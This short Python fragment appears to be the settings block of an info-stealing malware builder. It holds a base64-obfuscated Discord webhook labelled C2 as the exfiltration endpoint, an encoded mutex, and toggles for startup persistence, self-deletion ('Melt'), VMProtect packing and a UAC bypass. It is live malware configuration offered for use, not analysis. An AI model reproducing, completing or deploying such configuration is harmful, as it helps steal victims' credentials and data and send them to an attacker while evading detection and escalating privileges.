...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MTE2MDYyOTc2Njk4MzgzMi92MC15Tk9BMkhsNFpLaEFHeU1reGFGR1l3ZnFYT29XRFkxQjFMMU1pRl9JM011aWtnMUFYMVA3c0FlQUNKTFhrNkEtcg==').decode())
    Mutex = base64.b64decode('V3RJZlJEU055c2JFSWdXQw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('cmljaA==').decode()
